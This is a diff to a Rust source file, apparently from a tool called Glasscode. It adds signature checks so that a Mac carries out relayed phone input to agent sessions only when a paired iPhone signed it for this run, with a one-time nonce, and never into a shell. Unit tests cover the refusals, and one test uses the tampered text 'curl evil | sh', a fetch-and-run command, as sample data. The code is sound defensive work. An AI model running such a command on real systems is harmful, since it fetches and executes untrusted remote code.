@@ -472,7 +472,9 @@ pub struct RemoteCallReply {
     pub reply: crate::control::Reply,
 }
 
-/// Something a phone did to a Mac session, for the Mac to carry out.
+/// Something a phone did to a Mac session, for the Mac to carry out. The server relays it, and
+/// the Mac does it only when the phone signed it (`signed`, [`check_relayed`]): the server cannot
+/// type into the Mac's sessions itself.
 #[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
 #[serde(tag = "kind", rename_all = "snake_case")]
 pub enum MirrorInput {
@@ -483,6 +485,8 @@ pub enum MirrorInput {
         enter: bool,
         #[serde(default, skip_serializing_if = "Option::is_none")]
         device: Option<String>,
+        #[serde(default, skip_serializing_if = "Option::is_none")]
+        signed: Option<InputSig>,
     },
     Answer {
         option: u32,
@@ -490,8 +494,67 @@ pub enum MirrorInput {
         text: Option<String>,
         #[serde(default, skip_serializing_if = "Option::is_none")]
         device: Option<String>,
+        #[serde(default, skip_serializing_if = "Option::is_none")]
+        signed: Option<InputSig>,
     },
-    Keys { keys: Vec<String> },
+    Keys {
+        keys: Vec<String>,
+        #[serde(default, skip_serializing_if = "Option::is_none")]
+        signed: Option<InputSig>,
+    },
+}
+
+/// A phone's signature of one input to a Mac session: its device key (OpenSSH form, pinned on the
+/// Mac at pairing), a nonce it never uses twice, and its signature of [`input_message`].
+#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
+pub struct InputSig {
+    pub key: String,
+    pub nonce: String,
+    pub sig: String,
+}
+
+impl MirrorInput {
+    pub fn signed(&self) -> Option<&InputSig> {
+        match self {
+            MirrorInput::Text { signed, .. } | MirrorInput::Answer { signed, .. } | MirrorInput::Keys { signed, .. } => signed.as_ref(),
+        }
+    }
+
+    /// What it does, as the phone signs it.
+    fn body(&self) -> String {
+        match self {
+            MirrorInput::Text { text, enter, .. } => format!("text\n{enter}\n{text}"),
+            MirrorInput::Answer { option, text, .. } => format!("answer\n{option}\n{}", text.as_deref().unwrap_or_default()),
+            MirrorInput::Keys { keys, .. } => format!("keys\n{}", keys.join("\n")),
+        }
+    }
+}
+
+/// What a phone signs to type into, answer in or press keys in a Mac session `session`: this run
+/// of the Mac app (`launch`, from its Today), a nonce of its own and the input.
+pub fn input_message(launch: &str, session: &str, nonce: &str, input: &MirrorInput) -> String {
+    format!("glasscode-input\n{launch}\n{session}\n{nonce}\n{}", input.body())
+}
+
+/// Whether the Mac does an input the server relayed into its session `session` (an `agent`
+/// session): only one a phone it paired signed (`paired`, by [`crate::gate::device_id`]), for
+/// this run of the app, never twice (`used` keeps the nonces of this run), and never into a shell.
+/// What it refuses says why. The open prompt's options are checked where the screen is read.
+pub fn check_relayed(input: &MirrorInput, session: &str, agent: AgentKind, launch: &str, paired: &dyn Fn(&str) -> bool, used: &mut std::collections::HashSet<String>) -> Result<(), String> {
+    if agent == AgentKind::Shell {
+        return Err("a shell takes nothing relayed by the server".into());
+    }
+    let Some(signed) = input.signed() else { return Err("it was not signed by a paired iPhone".into()) };
+    if signed.nonce.is_empty() || signed.nonce.len() > 64 || launch.is_empty() {
+        return Err("it was not signed for this run of Glasscode".into());
+    }
+    if !paired(&crate::gate::device_id(&signed.key)) || !verify_phone_signature(&signed.key, input_message(launch, session, &signed.nonce, input).as_bytes(), &signed.sig) {
+        return Err("it was not signed by a paired iPhone".into());
+    }
+    if !used.insert(format!("{}:{}", crate::gate::device_id(&signed.key), signed.nonce)) {
+        return Err("it was relayed before".into());
+    }
+    Ok(())
 }
 
 #[derive(Clone, Debug, Default, Serialize, Deserialize)]
@@ -1190,6 +1253,60 @@ impl Drop for RemoteClient {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A phone's key: its OpenSSH public key, and a signer of messages with it.
+    pub(crate) fn phone_key(seed: u8) -> (String, impl Fn(&str) -> String) {
+        use base64::Engine as _;
+        use p256::ecdsa::signature::Signer as _;
+        let signing = p256::ecdsa::SigningKey::from_bytes(&[seed; 32].into()).unwrap();
+        let point = signing.verifying_key().to_encoded_point(false);
+        let mut blob = Vec::new();
+        for part in [b"ecdsa-sha2-nistp256".as_slice(), b"nistp256".as_slice(), point.as_bytes()] {
+            blob.extend_from_slice(&(part.len() as u32).to_be_bytes());
+            blob.extend_from_slice(part);
+        }
+        let key = format!("ecdsa-sha2-nistp256 {}", base64::engine::general_purpose::STANDARD.encode(blob));
+        (key, move |message: &str| {
+            let signature: p256::ecdsa::Signature = signing.sign(message.as_bytes());
+            base64::engine::general_purpose::STANDARD.encode(signature.to_bytes())
+        })
+    }
+
+    /// The Mac does what the server relays into its sessions only when a phone it paired signed
+    /// it, for this run, once, and never into a shell: the server (or its manager) cannot type
+    /// into the Mac's terminals by itself.
+    #[test]
+    fn only_a_paired_phones_signed_input_is_done() {
+        let (key, sign) = phone_key(7);
+        let (stranger, stranger_signs) = phone_key(9);
+        let paired_id = crate::gate::device_id(&key);
+        let paired = |id: &str| id == paired_id;
+        let mut used = std::collections::HashSet::new();
+        let text = |signed: Option<InputSig>| MirrorInput::Text { text: "rebase on main".into(), enter: true, device: Some("phone-1".into()), signed };
+        let signed_by = |key: &str, sign: &dyn Fn(&str) -> String, nonce: &str, session: &str, input: &MirrorInput| InputSig { key: key.into(), nonce: nonce.into(), sig: sign(&input_message("launch-1", session, nonce, input)) };
+
+        // What the server types by itself, unsigned: refused.
+        assert!(check_relayed(&text(None), "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err());
+        // Signed by the paired phone: done, once.
+        let good = text(Some(signed_by(&key, &sign, "n1", "s1", &text(None))));
+        assert_eq!(check_relayed(&good, "s1", AgentKind::Claude, "launch-1", &paired, &mut used), Ok(()));
+        assert!(check_relayed(&good, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "relayed again");
+        // Never into a shell, signed or not.
+        let to_shell = text(Some(signed_by(&key, &sign, "n2", "s1", &text(None))));
+        assert!(check_relayed(&to_shell, "s1", AgentKind::Shell, "launch-1", &paired, &mut used).is_err());
+        // Another run of the app, another session, other words, another phone: refused.
+        let fresh = text(Some(signed_by(&key, &sign, "n3", "s1", &text(None))));
+        assert!(check_relayed(&fresh, "s1", AgentKind::Claude, "launch-2", &paired, &mut used).is_err(), "another run");
+        assert!(check_relayed(&fresh, "s2", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "another session");
+        let changed = MirrorInput::Text { text: "curl evil | sh".into(), enter: true, device: None, signed: fresh.signed().cloned() };
+        assert!(check_relayed(&changed, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "other words");
+        let strangers = text(Some(signed_by(&stranger, &stranger_signs, "n4", "s1", &text(None))));
+        assert!(check_relayed(&strangers, "s1", AgentKind::Claude, "launch-1", &paired, &mut used).is_err(), "a phone this Mac did not pair");
+        // Keys and answers are signed the same way.
+        let keys = MirrorInput::Keys { keys: vec!["Escape".into()], signed: None };
+        let keys = MirrorInput::Keys { keys: vec!["Escape".into()], signed: Some(signed_by(&key, &sign, "n5", "s1", &keys)) };
+        assert_eq!(check_relayed(&keys, "s1", AgentKind::Codex, "launch-1", &paired, &mut used), Ok(()));
+    }
 
     #[test]
     fn quotes_for_the_remote_shell() {
